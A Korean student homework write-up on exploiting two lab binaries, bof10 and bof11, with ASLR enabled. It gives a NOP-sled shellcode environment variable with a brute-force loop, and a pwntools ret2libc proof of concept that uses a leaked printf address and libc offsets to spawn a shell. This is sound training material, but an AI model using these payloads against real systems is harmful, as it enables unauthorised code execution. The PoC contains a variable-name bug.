# GBC Security_09

## HW #9

### 익스플로잇
---

### 1. sum up

* ASLR (Address Space Layout Randomization) : 프로세스의 가상 주소공간에 heap, stack, libc등이 mapping 될 때 해당 주소값을 프로그램 실행 시마다 랜덤하게 변경하는 기법
* 확인 방법 : `cat /proc/sys/kernel/randomize_va_space`
	* 0 : 비활성화
	* 1 : 부분 활성화 (stack, libc)
	* 2 : 완전 활성화 (stack, libc, heap) 
* 따라서, ASLR이 활성화된 경우, ASLR 우회가 필요하다.

### 2. bof 10 

* bof 8과 비슷한 문제인데, ASLR이 활성화 되어있다.


> `cat /proc/sys/kernel/randomize_va_space` 명령어를 통해, ASLR 활성여부를 알 수 있다.
bof 10의 경우, `2`로 표시되므로, `stack, libc, heap`이 모두 활성화된 상태

![bof10-1](https://user-images.githubusercontent.com/47182864/61504929-277dbe80-aa18-11e9-964d-58e395d6a202.png)

>`bat ./bof10`으로 소스 코드를 보면 !  
> `strcpy()` 의 취약점을 이용할 것이고,  
> `BUF_SIZE`가 8밖에 되지 않으므로, 쉘코드를 환경변수에 등록해야 한다.  

```shell
export SHELLCODE=`python -c "print '\x90'*10 + '\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81'"`
```

![bof10-3](https://user-images.githubusercontent.com/47182864/61504931-28165500-aa18-11e9-92d8-a6c76eb77616.png)

> ASLR이 활성화 되었을 경우, 다음과 같이 SHELLCODE 환경변수의 주소값이 실행시마다 바뀐다.

![bof10-2](https://user-images.githubusercontent.com/47182864/61508532-48004580-aa25-11e9-9cd6-cbafd19c91da.png)

따라서, 쉘 코드를 환경 변수에 등록해놓았더라도 쉘 코드가 실행되기 어렵다.   
위에서 `NOP`코드를 10byte 넣었는데, 그럼 쉘 코드를 실행시킬 수 있는 address의 범위는 __11byte__이다.
> __왜 범위가 11byte?__ 쉘 코드가 `0x1000`에 저장되었다 했을 때, `0x1000`부터 `NOP`코드가 10개 들어간다 (0x1000~0x1009). `0x1009`까지 `NOP`이고, `0x100a`에는 쉘코드가 들어가므로 11byte.

NOP코드를 10byte 넣을 때, 쉘 코드가 실행될 확률 (환경변수의 주소값 : 0x00000000 ~ 0xffffffff)
 
```
(11 / 0xffffffff) * 100 
```
* NOP코드를 많이 넣을 수록, 쉘 코드가 실행될 확률이 높아진다.
* 환경 변수에 NOP코드를 넣을 수 있는 최대 한계 : 130000 byte

NOP코드를 130000 byte 넣을 때, 쉘 코드가 실행될 확률
 
```
(130001 / 0xffffffff) * 100 = 1.549%
```

* 1%가 넘으면, 유의미한 확률이라고 한다. 따라서, 브루트포스 공격을 할 수 있다!


> 환경변수

```shell
export SHELLCODE=`python -c "print '\x90'*130000 + '\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81'"`
```
![bof10-4](https://user-images.githubusercontent.com/47182864/61504932-28165500-aa18-11e9-895f-f4d65183b00f.png)

> 익스플로잇

```shell
while : ; do ./bof10 `python -c "print 'a'*20 + '\x36\x4c\xc6\xff'"` ; done
while : ; do ./bof10 `python -c "print 'a'*20 + '\xe8\xd2\xef\xff'"` ; done
```
> > `buf` 와 `return address` 까지의 거리는 20 byte이므로, 쓰레기 값으로 20byte를 채워주고, `SHELLCODE` 환경변수 주소값을 0xff800000 ~ 0xffffffff 사이의 적당한 값으로 기입한다.  
> >  `while` 문을 이용하여 무한루프를 돌린다.


##### [ Result ]

![bof10-5](https://user-images.githubusercontent.com/47182864/61504933-28aeeb80-aa18-11e9-96f6-2ce312649f6b.png)

### 3. bof 10 

ASLR 활성여부 확인한다.
> 명령어 : $`cat /proc/sys/kernel/randomize_va_space`  
bof 11의 경우, `2`로 표시되므로, `stack, libc, heap`이 모두 활성화된 상태이다.

![bof11-2](https://user-images.githubusercontent.com/47182864/61511667-6e78ad80-aa32-11e9-8aa7-7b19fd340ba0.png)

> ASLR 때문에 `printf` 함수의 주소값이 계속 달라진다.

![bof11-1](https://user-images.githubusercontent.com/47182864/61511666-6e78ad80-aa32-11e9-80bb-0e137a21cc67.png)

stack 실행 권한을 확인한다.
> $ `cat /proc/sef/maps` : 현재 프로세스의 메모리 구조를 확인할 수 있다.  
> stack의 권한이 __rw-p__로, 읽기(r)와 쓰기(w) 권한만 있고, 실행될 어셈블리어들이 저장되는 text섹션의 권한은 __r-xp__로, 읽기(r)와 실행(x) 권한만 있다.  

![bof11-3](https://user-images.githubusercontent.com/47182864/61512152-f4492880-aa33-11e9-803e-8f9c55ddb102.png)

NX bit가 있으므로, RTL 기법을 사용해야 하는데, ASLR이 활성화 되어 있어서 RTL을 적용할 수 없다.
하지만, 위에서 실행시켜 보았을 때 `printf` 함수의 주소값이 유출되고 있으므로, RTL을 적용할 수 있다.

> __메모리의 데이터를 유출시킬 수 있다는 조건__이 있을 경우, __ASLR 이 활성화되어있어도 RTL 을 적용__할 수 있다.

#### solving
system 주소값, /bin/sh 주소값, pop rdi ; ret 주소값을 구한 후, printf 함수와의 거리를 계산하면 ASLR 을 우회할 수 있다.
> libc 라이브러리 내부 함수끼리의 상대적 거리는 항상 같다.

* `printf`와 `system`함수 거리

```shell
(printf 의 주소값) + X = (system 함수의 주소값)

 X = (system 함수의 주소값) - (printf 의 주소값)
```

![bof11-4](https://user-images.githubusercontent.com/47182864/61514671-80ab1980-aa3b-11e9-8ec7-dc9b74a33a0b.png)


```shell
X = -66672
```
---
* `printf`와 `/bin/sh` 거리

```shell
(printf 의 주소값) + Y = (/bin/sh 의 주소값)

 Y = (/bin/sh 의 주소값) - (printf 의 주소값)
```
![bof11-5](https://user-images.githubusercontent.com/47182864/61514672-8143b000-aa3b-11e9-9cfe-e812a72ff044.png)

```
Y = 1275223
```

---

* `printf`와 `pop rdi ; ret` 거리

```shell
(printf 의 주소값) + Z = ("pop rdi ; ret" 가젯의 주소값)

 Z = (pop rdi ; ret 가젯의 주소값) - (printf 의 주소값)
```
```
pop rdi ; ret 가젯의 주소값 = (libc 의 베이스 주소값) + ("pop rdi ; ret" 의 오프셋)
```

![bof11-7](https://user-images.githubusercontent.com/47182864/61514674-8143b000-aa3b-11e9-90b3-af95f8ffa853.png)
![bof11-8](https://user-images.githubusercontent.com/47182864/61514676-8143b000-aa3b-11e9-9fe9-cb20c30dc005.png)

```
Z = -214782
```
---

* `buf` 와 `return address` 거리

![bof11-9](https://user-images.githubusercontent.com/47182864/61515595-f87a4380-aa3d-11e9-8111-a9262840e830.png)

```
24
```
---

##### Payload

```shell
쓰레기값 (24byte) + pop rdi ; ret 가젯의 주소 (8byte) + /bin/sh의 주소 (8byte) + system 함수의 주소 (8byte)
```
> pop rdi ; ret 가젯의 주소값 = printf 주소값 + (-214782)  

> system 함수 주소값 = printf 주소값 + (-66672)  
  
>  "/bin/sh" 주소값 = printf 주소값 + 1275223

* 실행도중 printf의 주소값이 필요한데, 이를 쉘 상에서 하기 어려우므로 POC코드를 이용한다.

##### POC 코드
```python
from pwn import *

p = process('./bof11')	# 익스플로잇 대상이 되는 실행파일 실행 + process 반환

p.recvuntil('printf() address : ')	# 해당 문자열이 나올때까지 data 받아서 반환
printf_a = p.recvuntil('\n')
printf_a = int(printf, 16)

sys = printf_a + (-66672)
binsh = printf_a + (1275223)
gadget = printf_a + (-214782)
buf = 24

payload = "G" * buf
payload += p64(gadget)		# p64(num) : num을 64bit 형식으로 패킹
payload += p64(binsh)
payload += p64(sys)
p.send(payload)	# payload를 프로세스에 입력

p.interactive() # 프로세스의 입력스트림과 출력 스트림을 연다
```
* `recvuntil` 함수로 'printf() address : ' 라는 문자열까지 데이터를 받은 후 '\n' 까지 데이터를 받으면 정확하게 `printf` 함수의 주소값을 반환 받을 수 있다고 한다. 그러면 반환받은 `printf` 주소값을 이용해서 payload를 만든 후 `send` 함수로 payload를 보내서 익스플로잇을 시도한다. 

![bof11--10](https://user-images.githubusercontent.com/47182864/61517430-2eb9c200-aa42-11e9-90dc-b9ce4777c208.png)

##### Result

![bof11-11](https://user-images.githubusercontent.com/47182864/61517431-2eb9c200-aa42-11e9-836b-66e8ff0ac620.png)

---

### Ect
---
감사합니다 !!!!!



